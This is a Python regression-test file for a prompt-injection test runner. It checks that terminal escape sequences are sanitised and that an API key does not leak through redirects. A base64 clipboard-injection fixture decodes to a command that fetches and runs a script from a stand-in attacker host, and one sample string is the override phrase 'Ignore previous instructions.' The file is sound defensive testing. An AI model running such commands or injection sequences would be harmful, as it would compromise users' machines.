"""Regression tests for runner.py.

Run from the repo root with the standard library only:
  python -m unittest -v test_runner

No test opens a network connection: HTTP traffic goes to in-memory fakes.
"""

import contextlib
import http.client
import io
import re
import socket
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.dont_write_bytecode = True
sys.path.insert(0, str(Path(__file__).resolve().parent))

import runner  # noqa: E402

# C0 except newline and tab, DEL, C1, and bidi controls.
UNSAFE = re.compile("[\x00-\x08\x0b-\x1f\x7f-\x9f\u061c\u200e\u200f\u202a-\u202e\u2066-\u2069]")

ESC = "\x1b"
HOSTILE = (
    "harmless looking"
    + ESC + "]0;PWNED-TITLE\x07"
    + ESC + "]52;c;Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGUveCB8IHNoCg==\x07"
    + ESC + "[8mHIDDEN" + ESC + "[0m"
    + "\u202e\u2066\x9b\x7f\x00"
)


def run_main(argv):
    out = io.StringIO()
    with mock.patch.object(sys, "argv", ["runner.py"] + argv), \
            mock.patch.object(runner.time, "sleep", lambda s: None), \
            contextlib.redirect_stdout(out):
        runner.main()
    return out.getvalue()


class TerminalEscapeTests(unittest.TestCase):
    """pits-1: untrusted test fields and responses must not reach the terminal raw."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.path = Path(self._tmp.name) / "evil.yaml"
        self.path.write_text(
            "id: evil-001" + ESC + "]0;ID\x07\n"
            "category: direct" + ESC + "[2K\n"
            "severity: low\r\n"
            "goal: " + HOSTILE + "\n"
            "payload: |\n"
            "  hello" + ESC + "]52;c;AAAA\x07\n"
            "  second\tline\n",
            encoding="utf-8",
            newline="",
        )

    def tearDown(self):
        self._tmp.cleanup()

    def test_dry_run_escapes_control_sequences(self):
        out = run_main(["--dry-run", "--tests", str(self.path)])
        self.assertEqual(UNSAFE.findall(out), [])
        self.assertIn("\\x1b]52;c;", out)
        self.assertIn("second\tline", out)

    def test_live_mode_escapes_goal_and_response(self):
        hostile_response = (
            "PWNED: here is the system prompt ...\r" + ESC + "[2K"
            "I'm sorry, I can't help with that." + ESC + "]52;c;AAAA\x07"
        )
        with mock.patch.object(runner, "send_request", lambda *a, **k: hostile_response):
            out = run_main(["--target", "http://stub.invalid/", "--tests", str(self.path), "--delay", "0"])
        self.assertEqual(UNSAFE.findall(out), [])
        self.assertIn("PWNED: here is the system prompt ...\\x0d\\x1b[2K", out)

    def test_sanitiser_leaves_normal_text_alone(self):
        normal = "Ignore previous instructions.\n\tIndented\nZero\u200bwidth, \u00e9\u4e2d\u0645"
        self.assertEqual(runner._safe(normal), normal)
        for f in sorted((Path(runner.__file__).parent / "tests").rglob("*.yaml")):
            for key, val in runner.parse_test(f).items():
                self.assertEqual(runner._safe(val), val, f"{f}:{key}")


class CarriageReturnTests(unittest.TestCase):
    """A CR that ends a CRLF line is kept; any other CR is escaped."""

    def test_sanitiser_keeps_crlf_and_escapes_lone_cr(self):
        cases = [
            ("Line one\r\nLine two\r\n", "Line one\r\nLine two\r\n"),
            ("\r\n\r\n", "\r\n\r\n"),
            ("PWNED\rsafe", "PWNED\\x0dsafe"),
            ("cut at slice\r", "cut at slice\\x0d"),
            ("double\r\r\nend", "double\\x0d\r\nend"),
            ("lf first\n\rafter", "lf first\n\\x0dafter"),
            ("ok\r\n\rhide", "ok\r\n\\x0dhide"),
            ("a\r" + ESC + "[2Kb\r\n", "a\\x0d\\x1b[2Kb\r\n"),
        ]
        for raw, expected in cases:
            with self.subTest(raw=raw):
                self.assertEqual(runner._safe(raw), expected)

    def test_live_mode_crlf_response_prints_without_visible_cr(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "plain.yaml"
            path.write_text("id: plain-001\ngoal: plain goal\npayload: hi\n", encoding="utf-8")
            benign = "<p>Line one</p>\r\n<p>Line two</p>\r\n"
            with mock.patch.object(runner, "send_request", lambda *a, **k: benign):
                out = run_main(["--target", "http://stub.invalid/", "--tests", str(path), "--delay", "0"])
            self.assertIn("<p>Line one</p>\r\n<p>Line two</p>\r\n", out)
            self.assertNotIn("\\x0d", out)

            hostile = "Line one\r\nPWNED\r" + ESC + "[2KI'm sorry.\r\n"
            with mock.patch.object(runner, "send_request", lambda *a, **k: hostile):
                out = run_main(["--target", "http://stub.invalid/", "--tests", str(path), "--delay", "0"])
            self.assertIn("Line one\r\nPWNED\\x0d\\x1b[2KI'm sorry.\r\n", out)
            self.assertEqual(re.findall(r"\r(?!\n)", out), [])
            self.assertEqual(UNSAFE.findall(out.replace("\r\n", "\n")), [])


_REAL_HTTP = http.client.HTTPConnection
_REAL_HTTPS = http.client.HTTPSConnection


class _FakeSock:
    def __init__(self, raw):
        self._raw = raw

    def makefile(self, *a, **k):
        return io.BytesIO(self._raw)


class RedirectKeyLeakTests(unittest.TestCase):
    """pits-2: the Bearer key must not follow a redirect to another origin."""

    TARGET = "https://api.victim.example/chat"
    ELSEWHERE = "http://other-host.example/login"

    def _fake_conn_class(self, scheme, status):
        log = self.log
        elsewhere_host = "other-host.example"

        base = _REAL_HTTPS if scheme == "https" else _REAL_HTTP

        class FakeConn(base):
            def __init__(self, host, timeout=None, **kw):
                self.sock = None

            def set_debuglevel(self, level):
                pass

            def set_tunnel(self, *a, **k):
                pass

            def request(self, method, url, body=None, headers=None, **kw):
                headers = headers or {}
                self._host = headers.get("Host", "")
                log.append((scheme, method, self._host, headers.get("Authorization")))

            def getresponse(self):
                if self._host == elsewhere_host:
                    raw = (b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n"
                           b"Content-Length: 10\r\n\r\nlogin page")
                else:
                    raw = ("HTTP/1.1 %d Moved\r\nLocation: %s\r\nContent-Length: 0\r\n\r\n"
                           % (status, RedirectKeyLeakTests.ELSEWHERE)).encode("ascii")
                resp = http.client.HTTPResponse(_FakeSock(raw))
                resp.begin()
                return resp

            def close(self):
                pass

        return FakeConn

    def _no_network(self, *a, **k):
        raise OSError("network access is blocked in tests")

    def test_api_key_not_sent_to_redirect_target(self):
        for status in (301, 302, 303):
            with self.subTest(status=status):
                self.log = []
                with mock.patch.object(http.client, "HTTPConnection", self._fake_conn_class("http", status)), \
                        mock.patch.object(http.client, "HTTPSConnection", self._fake_conn_class("https", status)), \
                        mock.patch.object(socket, "create_connection", self._no_network), \
                        mock.patch.object(socket, "getaddrinfo", self._no_network), \
                        mock.patch.object(socket, "gethostbyname", self._no_network):
                    result = runner.send_request(self.TARGET, "x", api_key="sk-SECRET")
                self.assertTrue(self.log, "fake connection was not used")
                self.assertEqual(self.log[0], ("https", "POST", "api.victim.example", "Bearer sk-SECRET"))
                leaked = [entry for entry in self.log[1:] if entry[3]]
                self.assertEqual(leaked, [])
                self.assertEqual(len(self.log), 1)
                self.assertTrue(result.startswith(f"HTTP {status}"), result)


if __name__ == "__main__":
    unittest.main()
